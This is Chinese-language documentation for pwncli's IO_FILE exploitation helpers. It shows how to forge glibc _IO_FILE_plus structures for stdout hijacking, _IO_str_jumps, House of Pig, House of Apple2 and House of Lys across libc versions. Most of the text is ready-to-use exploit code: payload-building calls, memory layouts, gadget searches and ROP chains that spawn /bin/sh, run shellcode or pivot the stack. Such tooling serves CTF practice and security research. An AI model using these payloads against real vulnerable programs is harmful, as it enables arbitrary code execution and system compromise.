

# IO_FILE 利用工具

`pwncli/utils/toolkit/io_file.py` 提供了 `IO_FILE_plus_struct` 类和 `payload_replace` 函数，用于构造伪造的 `_IO_FILE_plus` 结构体，快速生成各种 IO_FILE 利用的 payload。

```python
from pwncli import *
```

***

## 1 IO_FILE_plus_struct 基础用法

`IO_FILE_plus_struct` 继承自 pwntools 的 `FileStructure`，在其基础上增加了字段校验和多种利用方法。

### 1.1 创建与设置字段

```python
context.arch = "amd64"

fake_io = IO_FILE_plus_struct()
fake_io.flags = 0xfbad2800
fake_io._IO_write_base = 0
fake_io._IO_write_ptr = 1
fake_io.vtable = vtable_addr

# 生成 bytes payload
payload = fake_io.__bytes__()
```

设置不存在的字段会直接报错，避免手动构造时的拼写错误。

### 1.2 _mode 属性

`IO_FILE_plus_struct` 额外提供了 `_mode` 属性的读写支持（pwntools 原生 `FileStructure` 将其隐藏在 `unknown2` 中）：

```python
fake_io._mode = 0
```

### 1.3 查看结构体布局

`show_struct()` 打印 `_IO_FILE_plus` 在指定架构下各字段的偏移：

```python
IO_FILE_plus_struct.show_struct("amd64")
# arch : amd64
#   0x0 : _flags
#   0x8 : _IO_read_ptr
#   0x10 : _IO_read_end
#   ...
#   0xd8 : vtable

IO_FILE_plus_struct.show_struct("i386")
```

***

## 2 利用方法

以下所有方法均返回 `bytes` 类型的 payload。除特别标注外，仅支持 amd64 架构。

### 2.1 getshell_from_IO_puts_by_stdout（libc 2.23）

通过劫持 `_IO_2_1_stdout_`，在调用 `IO_puts` 时触发 `system("/bin/sh")`。

**适用版本**：libc 2.23

**原理**：伪造 vtable 使 `IO_puts` 调用 `system`，`flags` 字段存放 `/bin/sh` 字符串。

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `stdout_store_addr` | int | stdout 结构体地址，通常为 `libc.sym['_IO_2_1_stdout_']` |
| `system_addr` | int | `system` 函数地址 |
| `lock_addr` | int | 一个可读写的地址，用于 `_lock` 字段 |

**示例**：

```python
context.arch = "amd64"
libc_base = 0x7f0000000000

fake_io = IO_FILE_plus_struct()
payload = fake_io.getshell_from_IO_puts_by_stdout_libc_2_23(
    stdout_store_addr = libc_base + libc.sym['_IO_2_1_stdout_'],
    system_addr       = libc_base + libc.sym['system'],
    lock_addr         = libc_base + libc.sym['_IO_2_1_stdout_'] + 0x100
)
# 将 payload 写入 _IO_2_1_stdout_ 处
```

***

### 2.2 getshell_by_str_jumps_finish_when_exit（libc 2.24–2.29）

通过伪造 IO_FILE 结构体并将 vtable 指向 `_IO_str_jumps`，在 `exit` 调用 `_IO_flush_all_lockp` 时触发 `system("/bin/sh")`。

**适用版本**：libc 2.24–2.29（仅 amd64）

**前提**：已劫持 `_IO_list_all`，使其指向伪造的 IO_FILE。

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `_IO_str_jumps_addr` | int | `_IO_str_jumps` 地址 |
| `system_addr` | int | `system` 函数地址 |
| `bin_sh_addr` | int | `/bin/sh` 字符串地址 |

**示例**：

```python
context.arch = "amd64"
libc_base = 0x7f0000000000

fake_io = IO_FILE_plus_struct()
payload = fake_io.getshell_by_str_jumps_finish_when_exit(
    _IO_str_jumps_addr = libc_base + libc.sym['_IO_str_jumps'],
    system_addr        = libc_base + libc.sym['system'],
    bin_sh_addr        = libc_base + next(libc.search(b'/bin/sh'))
)
# 将 payload 写入 _IO_list_all 指向的地址
```

**注意**：返回的 payload 长度超过 `IO_FILE_plus` 本身大小，末尾附加了两个指针（padding + `system` 地址）。

***

### 2.3 House of Pig（执行 shellcode）

利用 House of Pig 技术，结合 `_IO_str_jumps` 和 `setcontext`，通过 `mprotect` 将内存设为可执行后跳转执行 shellcode。

**适用版本**：libc 2.31–2.33（仅 amd64）

**前提**：需提前将 `tcache_perthread_struct[0x400]` 填充为 `__free_hook - 0x1c0` 的地址。

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `fp_heap_addr` | int | 伪造 IO_FILE 所在的堆地址（替换 `_IO_list_all` 或 chain） |
| `gadget_addr` | int | `mov rdx, [rdi+8]; mov [rsp], rax; call [rdx+0x20]` gadget 地址 |
| `str_jumps_addr` | int | `_IO_str_jumps` 地址 |
| `setcontext_off_addr` | int | `setcontext+61`（或对应偏移）地址 |
| `mprotect_addr` | int | `mprotect` 函数地址 |
| `shellcode` | str/bytes | 要执行的 shellcode |
| `lock` | int | `_lock` 字段值，默认为 0 |

**示例**：

```python
context.arch = "amd64"
libc_base = 0x7f0000000000
heap_base = 0x560000000000
fp_addr = heap_base + 0x1000

fake_io = IO_FILE_plus_struct()
payload = fake_io.house_of_pig_exec_shellcode(
    fp_heap_addr       = fp_addr,
    gadget_addr        = libc_base + gadget_offset,
    str_jumps_addr     = libc_base + libc.sym['_IO_str_jumps'],
    setcontext_off_addr= libc_base + libc.sym['setcontext'] + 61,
    mprotect_addr      = libc_base + libc.sym['mprotect'],
    shellcode          = asm(shellcraft.sh()),
    lock               = 0
)
# 将 payload 写入 fp_addr，大小超过 0x310 + len(shellcode)
```

**payload 布局**：

```
+0x000: IO_FILE_plus 结构体
+0x100: 控制块
  +0x108: fp_heap_addr + 0x110  (rdx)
  +0x120: setcontext+61         (call target)
  +0x1a0: fp_heap_addr + 0x210  (rip -> mprotect ret 后跳转)
  +0x1a8: mprotect              (rip)
  +0x170: 0x2000                (rdx -> size)
  +0x168: page_aligned_addr     (rdi -> addr)
  +0x188: 7                     (rsi -> prot: rwx)
  +0x200: fp_heap_addr + 0x310  (shellcode 入口)
  +0x2c0: gadget_addr
+0x310: shellcode
```

***

### 2.4 House of Apple2 — 执行命令（exit 触发）

House of Apple2 技术，通过伪造 `_wide_data` 和 vtable 指向 `_IO_wfile_jumps`，在 `exit` 或任意 IO 操作时调用 `system(cmd)`。

**适用版本**：libc 2.35+（Ubuntu 22.04+，仅 amd64）

**核心约束**：`fake_file_addr` 必须是这个假 FILE 结构体在内存中的实际落地地址（如堆上某个 chunk 的起始），**不是**某个标准流（`_IO_2_1_stdout_` 等）的地址。该结构体内部使用自引用指针（`_codecvt` 指向自身、`_wide_data` 指向自身 - 0x48），只有当参数与真实地址一致时链条才能闭合。如果假 FILE 恰好原地覆盖了某个标准流，那么标准流地址和落地地址碰巧相等，此时传标准流地址也可行——但这只是巧合，不是一般情况。

此外 `*(fake_file_addr - 0x30)` 和 `*(fake_file_addr - 0x18)` 必须为 0（glibc 的 `_IO_wdoallocbuf` 会检查这两处）。

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `fake_file_addr` | int | 假 FILE 结构体在内存中的实际地址 |
| `_IO_wfile_jumps_addr` | int | `_IO_wfile_jumps` 地址 |
| `system_addr` | int | `system` 函数地址 |
| `cmd` | str | 要执行的命令，长度必须小于 7，默认为 `"sh"` |

**示例**：

```python
context.arch = "amd64"

# 假 FILE 写到堆上某个 chunk：fake_file_addr 是该 chunk 的地址
# 确保 *(fake_file_addr - 0x30) == 0 且 *(fake_file_addr - 0x18) == 0
fake_io = IO_FILE_plus_struct()
payload = fake_io.house_of_apple2_execmd_when_exit(
    fake_file_addr      = heap_addr,      # 假 FILE 的实际落地地址
    _IO_wfile_jumps_addr= libc.sym['_IO_wfile_jumps'],
    system_addr         = libc.sym['system'],
    cmd                 = "sh"
)
# 将 payload 写入 fake_file_addr 指向的位置，再让 _IO_list_all 指向它
```

**别名**：`house_of_apple2_execmd_when_do_IO_operation` 与该方法等价，适用于任意 IO 操作触发的场景。

**关键字段设置与自引用原理**：

```
flags      = "  sh\x00\x00\x00"  (命令嵌入 flags)
chain      = system_addr         (offset 0x68，最终被当作函数指针调用)
_wide_data = fake_file_addr - 0x48
_codecvt   = fake_file_addr
vtable     = _IO_wfile_jumps
_lock      = fake_file_addr - 0x10

glibc 调用链：
  _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE(fp)
    wide_vtable = *(_wide_data + 0xe0)
                = *(fake_file_addr - 0x48 + 0xe0)
                = *(fake_file_addr + 0x98)          <- 正好是 _codecvt 字段
                = fake_file_addr                    <- 指回自身
    call *(wide_vtable + 0x68)
       = *(fake_file_addr + 0x68)                   <- 正好是 chain 字段
       = system_addr
    -> system(fp)，fp 的首 8 字节是 flags = "  sh"，于是执行 sh
```

***

### 2.5 House of Apple2 — 栈迁移（exit 触发）

House of Apple2 的栈迁移变体。通过 `leave; ret` gadget 将栈迁移到可控地址，执行 ROP 链。

**适用版本**：libc 2.35+（Ubuntu 22.04+，仅 amd64）

**核心约束**：同 2.4——`fake_file_addr` 必须是假 FILE 的实际落地地址,`*(fake_file_addr - 0x30)` 和 `*(fake_file_addr - 0x18)` 必须为 0。

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `fake_file_addr` | int | 假 FILE 结构体在内存中的实际地址 |
| `_IO_wfile_jumps_addr` | int | `_IO_wfile_jumps` 地址 |
| `leave_ret_addr` | int | `leave; ret` gadget 地址 |
| `pop_rbp_addr` | int | `pop rbp; ret` gadget 地址 |
| `fake_rbp_addr` | int | 栈迁移目标地址（ROP 链起始位置 - 8） |

**示例**：

```python
context.arch = "amd64"

fake_io = IO_FILE_plus_struct()
payload = fake_io.house_of_apple2_stack_pivoting_when_exit(
    fake_file_addr      = heap_addr,      # 假 FILE 的实际落地地址
    _IO_wfile_jumps_addr= libc.sym['_IO_wfile_jumps'],
    leave_ret_addr      = libc_base + leave_ret_offset,
    pop_rbp_addr        = libc_base + pop_rbp_offset,
    fake_rbp_addr       = rop_chain_addr - 8
)
# 在 rop_chain_addr 处布置 ROP 链
```

**别名**：`house_of_apple2_stack_pivoting_when_do_IO_operation` 与该方法等价。

**执行流程**：

```
_IO_wfile_overflow -> _IO_wdoallocbuf -> 调用伪造的 vtable
-> pop rbp; ret  (rbp = fake_rbp_addr)
-> leave; ret    (rsp = fake_rbp_addr + 8 = rop_chain_addr)
-> ROP chain
```

***

### 2.6 House of Lys — getshell（libc < 2.37）

House of Lys 技术，通过 `_IO_obstack_jumps` 在 `exit` 时调用 `system("/bin/sh")`。

**适用版本**：libc < 2.37（仅 amd64）

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `system_addr` | int | `system` 函数地址 |
| `_IO_obstack_jumps_addr` | int | `_IO_obstack_jumps` 地址 |
| `fp_heap_addr` | int | 伪造 IO_FILE 所在的堆地址 |

**示例**：

```python
context.arch = "amd64"
libc_base = 0x7f0000000000
fp_addr = heap_base + 0x1000

fake_io = IO_FILE_plus_struct()
payload = fake_io.house_of_Lys_getshell_when_exit_under_2_37(
    system_addr            = libc_base + libc.sym['system'],
    _IO_obstack_jumps_addr = libc_base + libc.sym['_IO_obstack_jumps'],
    fp_heap_addr           = fp_addr
)
# payload 末尾附加了一个指针 (fp_heap_addr)
# 总大小 = sizeof(IO_FILE_plus) + 8
```

**关键字段设置**：

```
_IO_buf_base    = system        (函数指针)
_IO_save_base   = fp + 0xa0     (参数控制)
_wide_data      = "/bin/sh"     (命令字符串直接存入该字段)
vtable          = _IO_obstack_jumps + 0x20
```

***

### 2.7 House of Lys — 栈迁移（libc 2.30–2.35）

House of Lys 的栈迁移变体，通过三个 magic gadget 实现栈迁移后执行 ROP 链。

**适用版本**：libc 2.30–2.35（仅 amd64）

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `fp_heap_addr` | int | 伪造 IO_FILE 所在的堆地址 |
| `_IO_obstack_jumps_addr` | int | `_IO_obstack_jumps` 地址 |
| `rop_payload` | str/bytes | ROP 链 |
| `magic_gadget_one_addr` | int | `mov rdx, [rdi+8]; mov [rsp], rax; call [rdx+0x20]` |
| `magic_gadget_two_addr` | int | `mov rsp, rdx; ret` |
| `magic_gadget_three_addr` | int | `add rsp, 0x30; mov rax, r12; pop r12; ret` |

**查找 gadget**：

```python
g1 = libc.search(asm("mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]")).__next__()
g2 = libc.search(asm("mov rsp, rdx; ret")).__next__()
g3 = libc.search(asm("add rsp, 0x30; mov rax, r12; pop r12; ret")).__next__()
```

**示例**：

```python
context.arch = "amd64"
libc_base = 0x7f0000000000
fp_addr = heap_base + 0x1000

rop = flat([
    libc_base + pop_rdi_ret,
    libc_base + next(libc.search(b'/bin/sh')),
    libc_base + libc.sym['system']
])

fake_io = IO_FILE_plus_struct()
payload = fake_io.house_of_Lys_stack_pivoting_when_exit_between_2_30_and_2_36(
    fp_heap_addr           = fp_addr,
    _IO_obstack_jumps_addr = libc_base + libc.sym['_IO_obstack_jumps'],
    rop_payload            = rop,
    magic_gadget_one_addr  = libc_base + g1,
    magic_gadget_two_addr  = libc_base + g2,
    magic_gadget_three_addr= libc_base + g3
)
# 堆块大小需要 >= 0x128 + len(rop_payload)
```

**payload 布局**：

```
+0x000: IO_FILE_plus 结构体 + fp_heap_addr (0xe0 + 8 bytes)
+0x0e8: 控制块
  +0x0e8: magic_gadget_three (add rsp, 0x30; mov rax, r12; pop r12; ret)
  +0x0f0: rop_chain_addr     (可能需要替换)
  +0x108: magic_gadget_two   (mov rsp, rdx; ret)
+0x128: ROP chain
```

***

### 2.8 House of Lys — 栈迁移（libc 2.36）

libc 2.36 专用版本，gadget 签名与 2.30–2.35 不同。

**适用版本**：libc 2.36（仅 amd64）

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `fp_heap_addr` | int | 伪造 IO_FILE 所在的堆地址 |
| `_IO_obstack_jumps_addr` | int | `_IO_obstack_jumps` 地址 |
| `rop_payload` | str/bytes | ROP 链 |
| `magic_gadget_one_addr` | int | `mov rdx, [rax+0x38]; mov rdi, rax; call [rdx+0x20]` |
| `magic_gadget_two_addr` | int | `mov rsp, rdx; ret` |
| `magic_gadget_three_addr` | int | `add rsp, 0x38; mov rax, rcx; ret` |

**查找 gadget**：

```python
g1 = libc.search(asm("mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20]")).__next__()
g2 = libc.search(asm("mov rsp, rdx; ret")).__next__()
g3 = libc.search(asm("add rsp, 0x38; mov rax, rcx; ret")).__next__()
```

**示例**：

```python
context.arch = "amd64"
libc_base = 0x7f0000000000
fp_addr = heap_base + 0x1000

rop = flat([
    libc_base + pop_rdi_ret,
    libc_base + next(libc.search(b'/bin/sh')),
    libc_base + libc.sym['system']
])

fake_io = IO_FILE_plus_struct()
payload = fake_io.house_of_Lys_stack_pivoting_when_exit_in_2_36(
    fp_heap_addr           = fp_addr,
    _IO_obstack_jumps_addr = libc_base + libc.sym['_IO_obstack_jumps'],
    rop_payload            = rop,
    magic_gadget_one_addr  = libc_base + g1,
    magic_gadget_two_addr  = libc_base + g2,
    magic_gadget_three_addr= libc_base + g3
)
# 堆块大小需要 >= 0x130 + len(rop_payload)
```

**payload 布局**：

```
+0x000: IO_FILE_plus 结构体 + fp_heap_addr (0xe0 + 8 bytes)
+0x0e8: 控制块
  +0x0e8: rop_chain_addr      (可能需要替换)
  +0x0f0: magic_gadget_three  (add rsp, 0x38; mov rax, rcx; ret)
  +0x110: magic_gadget_two    (mov rsp, rdx; ret)
  +0x120: rop_chain_addr + 8
+0x130: ROP chain
```

**与 2.30–2.35 版本的差异**：

| 差异项 | 2.30–2.35 | 2.36 |
|--------|-----------|------|
| gadget_one | `mov rdx, [rdi+8]` | `mov rdx, [rax+0x38]` |
| gadget_three | `add rsp, 0x30; ... pop r12; ret` | `add rsp, 0x38; mov rax, rcx; ret` |
| `_IO_buf_base` | `gadget_one` | `gadget_one - 0x8` |
| ROP 起始偏移 | `+0x128` | `+0x130` |

***

## 3 payload_replace 工具函数

`payload_replace` 用于在已有 payload 的指定位置替换数据，常配合 `IO_FILE_plus_struct` 使用，例如在 House of Lys 中替换控制块中的地址。

**参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `payload` | str/bytes | 原始 payload |
| `rpdict` | dict | 替换字典，key 为偏移（int）或模式（bytes），value 为替换值（int/bytes/str） |
| `filler` | str | 当偏移超出 payload 长度时的填充字节，默认 `"\x00"` |

**按偏移替换**：

```python
context.arch = "amd64"

payload = b"\x00" * 0x100
payload = payload_replace(payload, {
    0x10: 0xdeadbeef,         # 在偏移 0x10 处写入 int（按当前 context.bits pack）
    0x20: b"\x41\x42\x43",    # 在偏移 0x20 处写入 bytes
    0x30: p64(0x12345678),    # 也可以预先 pack
})
```

**按模式替换**：

```python
payload = flat({
    0x00: b"AAAA_MARKER",
    0x20: b"BBBB_MARKER",
})

payload = payload_replace(payload, {
    b"AAAA_MARKER": 0xdeadbeef,   # 查找 b"AAAA_MARKER" 并替换
    b"BBBB_MARKER": p64(system),
})
```

**自动扩展**：当偏移超出 payload 长度时，会自动用 `filler` 填充扩展：

```python
payload = b"\x00" * 0x10
payload = payload_replace(payload, {
    0x20: 0xdeadbeef,  # payload 自动扩展到 0x28
}, filler="\x00")
```

**实际场景 — 配合 House of Lys 使用**：

House of Lys 栈迁移方法的文档中提到「`rop_chain_addr` 可能需要替换」，当 ROP 链位于其他内存区域时：

```python
# 先生成基础 payload
payload = fake_io.house_of_Lys_stack_pivoting_when_exit_between_2_30_and_2_36(...)

# 将控制块中的 rop_chain_addr 替换为实际地址
payload = payload_replace(payload, {
    0xf0: actual_rop_addr,
})
```

***

## 4 版本适用速查表

| 方法 | libc 版本 | 架构 | 触发方式 | 效果 |
|------|-----------|------|----------|------|
| `getshell_from_IO_puts_by_stdout_libc_2_23` | 2.23 | amd64/i386 | IO_puts | getshell |
| `getshell_by_str_jumps_finish_when_exit` | 2.24–2.29 | amd64 | exit | getshell |
| `house_of_pig_exec_shellcode` | 2.31–2.33 | amd64 | exit | 执行 shellcode |
| `house_of_apple2_execmd_when_exit` | 2.35+ | amd64 | exit / IO 操作 | 执行命令 |
| `house_of_apple2_stack_pivoting_when_exit` | 2.35+ | amd64 | exit / IO 操作 | 栈迁移 + ROP |
| `house_of_Lys_getshell_when_exit_under_2_37` | < 2.37 | amd64 | exit | getshell |
| `house_of_Lys_stack_pivoting_when_exit_between_2_30_and_2_36` | 2.30–2.35 | amd64 | exit | 栈迁移 + ROP |
| `house_of_Lys_stack_pivoting_when_exit_in_2_36` | 2.36 | amd64 | exit | 栈迁移 + ROP |
